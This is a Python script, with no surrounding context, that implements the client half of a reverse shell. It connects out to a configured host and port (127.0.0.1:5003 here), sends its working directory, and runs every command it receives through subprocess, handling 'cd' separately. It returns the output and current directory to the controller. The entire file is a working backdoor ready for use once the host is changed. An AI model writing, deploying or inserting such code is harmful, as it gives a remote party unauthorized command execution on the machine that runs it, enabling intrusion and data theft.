import socket
import os
import subprocess
import sys


SEPARATOR = "<sep>"
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5003
BUFFER_SIZE = 1024

soc = socket.socket()
soc.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
soc.send(cwd.encode('utf-8'))

while True:
    command = soc.recv(BUFFER_SIZE).decode('utf-8')
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            print(' '.join(splited_command[1:]))
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)

    cwd = os.getcwd()

    message = f"{output}{SEPARATOR}{cwd}"
    soc.send(message.encode('utf-8'))

soc.close()
